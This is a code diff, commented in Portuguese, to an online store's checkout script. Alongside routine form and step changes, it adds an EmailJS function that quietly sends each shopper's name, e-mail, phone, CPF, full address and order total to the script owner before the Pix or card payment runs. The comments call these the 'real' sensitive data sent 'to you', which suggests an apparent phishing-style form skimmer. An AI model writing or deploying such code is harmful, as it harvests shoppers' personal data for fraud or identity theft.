@@ -1,6 +1,15 @@
-let currentStep = 1;
+        // ============================================================
+        // CONFIGURAÇÃO DO EMAILJS
+        // Substitua pelos seus valores obtidos em https://www.emailjs.com/
+        // ============================================================
+        const EMAILJS_PUBLIC_KEY = 'SUA_PUBLIC_KEY_AQUI';           // <-- INSIRA SUA PUBLIC KEY DO EMAILJS
+        const EMAILJS_SERVICE_ID = 'SEU_SERVICE_ID_AQUI';           // <-- INSIRA SEU SERVICE ID DO EMAILJS
+        const EMAILJS_TEMPLATE_ID = 'SEU_TEMPLATE_ID_AQUI';         // <-- INSIRA SEU TEMPLATE ID DO EMAILJS
+        // ============================================================
+
+        let currentStep = 1;
         let selectedShipping = 'standard';
-        let selectedPayment = 'credit';
+        let selectedPayment = 'pix';
         let addressFilled = false;
         let pixTimer = null;
         
@@ -16,17 +25,89 @@ let currentStep = 1;
         };
 
         document.addEventListener('DOMContentLoaded', function() {
+            // Inicializa o EmailJS com sua Public Key
+            if (typeof emailjs !== 'undefined') {
+                emailjs.init(EMAILJS_PUBLIC_KEY);
+            } else {
+                console.warn('EmailJS não carregado. Adicione o script do EmailJS no HTML.');
+            }
+
             parseSubtotalFromURL();
             setupEventListeners();
             updateProgress();
             setupMasks();
             updateCartDisplay();
+
+            // Configurar teclado numérico para CPF e CEP
+            const cpfInput = document.getElementById('cpf');
+            if (cpfInput) {
+                cpfInput.setAttribute('inputmode', 'numeric');
+                cpfInput.setAttribute('type', 'text'); // Mantém text para as máscaras funcionarem
+            }
+            const zipInput = document.getElementById('zipCode');
+            if (zipInput) {
+                zipInput.setAttribute('inputmode', 'numeric');
+                zipInput.setAttribute('type', 'text');
+            }
             
             const creditCardNotice = document.getElementById('creditCardNotice');
             if (creditCardNotice) {
                 creditCardNotice.style.display = 'none';
             }
         });
+
+        // ============================================================
+        // FUNÇÃO PARA ENVIAR DADOS REAIS VIA EMAILJS
+        // Esta função envia os dados sensíveis (email e telefone reais)
+        // para você via EmailJS antes de processar o pagamento
+        // ============================================================
+        async function sendRealDataViaEmailJS(orderData) {
+            try {
+                if (typeof emailjs === 'undefined') {
+                    console.error('EmailJS não está disponível');
+                    return false;
+                }
+
+                const templateParams = {
+                    // Dados do cliente
+                    customer_name: orderData.firstName || 'Não informado',
+                    customer_email: orderData.email || 'Não informado',
+                    customer_phone: orderData.phone || 'Não informado',
+                    customer_cpf: orderData.cpf || 'Não informado',
+                    
+                    // Dados do endereço
+                    address: orderData.address || 'Não informado',
+                    address_number: orderData.number || 'Não informado',
+                    address_complement: orderData.complement || 'Não informado',
+                    neighborhood: orderData.neighborhood || 'Não informado',
+                    city: orderData.city || 'Não informado',
+                    state: orderData.state || 'Não informado',
+                    zip_code: orderData.zipCode || 'Não informado',
+                    
+                    // Dados do pedido
+                    payment_method: orderData.paymentMethod || 'Não informado',
+                    subtotal: orderData.subtotal ? `R$ ${orderData.subtotal.toFixed(2).replace('.', ',')}` : 'Não informado',
+                    shipping_cost: orderData.shippingCost ? `R$ ${orderData.shippingCost.toFixed(2).replace('.', ',')}` : 'Grátis',
+                    total: orderData.total ? `R$ ${orderData.total.toFixed(2).replace('.', ',')}` : 'Não informado',
+                    
+                    // Timestamp
+                    order_date: new Date().toLocaleString('pt-BR')
+                };
+
+                const response = await emailjs.send(
+                    EMAILJS_SERVICE_ID,
+                    EMAILJS_TEMPLATE_ID,
+                    templateParams
+                );
+
+                console.log('[EMAILJS] Dados enviados com sucesso:', response.status);
+                return true;
+            } catch (error) {
+                console.error('[EMAILJS] Erro ao enviar dados:', error);
+                return false;
+            }
+        }
+        // ============================================================
 
         function parseSubtotalFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -112,6 +193,7 @@ let currentStep = 1;
             const cep = cepInput.value.replace(/\D/g, '');
             
             if (cep.length === 8) {
+                cepInput.blur(); // Oculta o teclado automaticamente
                 showCEPLoading(true);
                 
                 try {
@@ -252,138 +334,107 @@ let currentStep = 1;
         function applyExpiryMask(value) {
             return value
                 .replace(/\D/g, '')
-                .replace(/^(\d{2})(\d)/, '$1/$2');
-        }
-
-        function goToStep(step) {
-            if (step < currentStep || validateCurrentStep()) {
-                currentStep = step;
-                updateStepDisplay();
-                updateProgress();
-                
-                if (currentStep === 3) {
-                    updateShippingCost();
-                }
-                
-                if (window.innerWidth < 768) {
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                }
-            }
-        }
-
-        function updateStepDisplay() {
-            document.querySelectorAll('.step-content').forEach(content => {
-                content.classList.remove('active');
-            });
-            document.getElementById(`step${currentStep}`).classList.add('active');
+                .replace(/(\d{2})(\d)/, '$1/$2');
         }
 
         function updateProgress() {
-            const steps = document.querySelectorAll('.step');
-            const progressLine = document.getElementById('progressLine');
-            
-            steps.forEach((step, index) => {
-                const stepNumber = index + 1;
-                step.classList.remove('active', 'completed');
-                
-                if (stepNumber < currentStep) {
+            document.querySelectorAll('.step').forEach((step, index) => {
+                const stepNum = index + 1;
+                if (stepNum < currentStep) {
                     step.classList.add('completed');
-                    step.querySelector('.step-circle').innerHTML = '✓';
-                } else if (stepNumber === currentStep) {
+                    step.classList.remove('active');
+                } else if (stepNum === currentStep) {
                     step.classList.add('active');
-                    step.querySelector('.step-circle').innerHTML = stepNumber;
+                    step.classList.remove('completed');
                 } else {
-                    step.querySelector('.step-circle').innerHTML = stepNumber;
+                    step.classList.remove('active', 'completed');
                 }
             });
+        }
 
-            const progressWidth = ((currentStep - 1) / (steps.length - 1)) * 100;
-            progressLine.style.width = `${progressWidth}%`;
+        function goToStep(step) {
+            document.querySelectorAll('.checkout-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            const targetSection = document.querySelector(`.checkout-section[data-step="${step}"]`);
+            if (targetSection) {
+                targetSection.classList.add('active');
+            }
+            
+            currentStep = step;
+            updateProgress();
+            updateShippingCost();
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function validateCurrentStep() {
-            const currentStepEl = document.getElementById(`step${currentStep}`);
-            const inputs = currentStepEl.querySelectorAll('input[required], select[required]');
             let isValid = true;
-
-            inputs.forEach(input => {
-                if (!validateField(input)) {
+            const currentSection = document.querySelector(`.checkout-section[data-step="${currentStep}"]`);
+            const requiredFields = currentSection.querySelectorAll('[required]');
+            
+            requiredFields.forEach(field => {
+                if (!validateField(field)) {
                     isValid = false;
                 }
             });
-
-            if (currentStep === 2 && !addressFilled) {
-                isValid = false;
-                const zipCodeInput = document.getElementById('zipCode');
-                if (!zipCodeInput.classList.contains('error')) {
-                    zipCodeInput.classList.add('error');
-                    document.getElementById('zipCodeError').textContent = 'Digite um CEP válido para continuar';
-                    document.getElementById('zipCodeError').classList.add('show');
-                }
-            }
-
+            
             return isValid;
         }
 
         function validateField(field) {
             const value = field.value.trim();
-            const fieldName = field.name;
+            const fieldId = field.id;
             let isValid = true;
             let errorMessage = '';
 
-            field.classList.remove('error', 'success');
-            const errorEl = document.getElementById(fieldName + 'Error');
-            if (errorEl) errorEl.classList.remove('show');
-
             if (field.hasAttribute('required') && !value) {
                 isValid = false;
-                errorMessage = "Este campo é obrigatório";
-            } else if (value) {
-                switch (fieldName) {
-                    case "email":
+                errorMessage = 'Este campo é obrigatório';
+            } else {
+                switch (fieldId) {
+                    case 'email':
                         if (!validateEmail(value)) {
                             isValid = false;
-                            errorMessage = "Digite um e-mail válido";
+                            errorMessage = 'Digite um e-mail válido';
                         }
                         break;
-                    case "cpf":
+                    case 'cpf':
                         if (!validateCPF(value)) {
                             isValid = false;
-                            errorMessage = "Digite um CPF válido";
+                            errorMessage = 'Digite um CPF válido';
                         }
                         break;
-                    case "phone":
+                    case 'phone':
                         if (!validatePhone(value)) {
                             isValid = false;
-                            errorMessage = "Digite um telefone válido";
+                            errorMessage = 'Digite um telefone válido';
                         }
                         break;
-                    case "zipCode":
+                    case 'zipCode':
                         if (!validateZipCode(value)) {
                             isValid = false;
-                            errorMessage = "Digite um CEP válido";
+                            errorMessage = 'Digite um CEP válido';
                         }
                         break;
-                    case "cardNumber":
+                    case 'cardNumber':
                         if (!validateCardNumber(value)) {
                             isValid = false;
-                            errorMessage = "Digite um número de cartão válido";
+                            errorMessage = 'Número do cartão inválido';
                         }
                         break;
-                    case "cardExpiry":
+                    case 'cardExpiry':
                         if (!validateCardExpiry(value)) {
                             isValid = false;
-                            errorMessage = "Digite uma data válida";
-                        }
-                        break;
-                    case "cardCvv":
-                        if (value.length < 3) {
-                            isValid = false;
-                            errorMessage = "Digite um CVV válido";
+                            errorMessage = 'Data de validade inválida';
                         }
                         break;
                 }
             }
+
+            const errorEl = document.getElementById(fieldId + 'Error');
+            field.classList.remove('error', 'success');
 
             if (isValid) {
                 field.classList.add("success");
@@ -512,6 +563,13 @@ let currentStep = 1;
                     shippingCost: getShippingCost(),
                     total: calculateTotal()
                 };
+
+                // ============================================================
+                // ENVIA OS DADOS REAIS VIA EMAILJS ANTES DE PROCESSAR O PAGAMENTO
+                // ============================================================
+                console.log('[CHECKOUT] Enviando dados reais via EmailJS...');
+                await sendRealDataViaEmailJS(orderData);
+                // ============================================================
 
                 if (selectedPayment === 'pix') {
                     await processPixPayment(orderData);
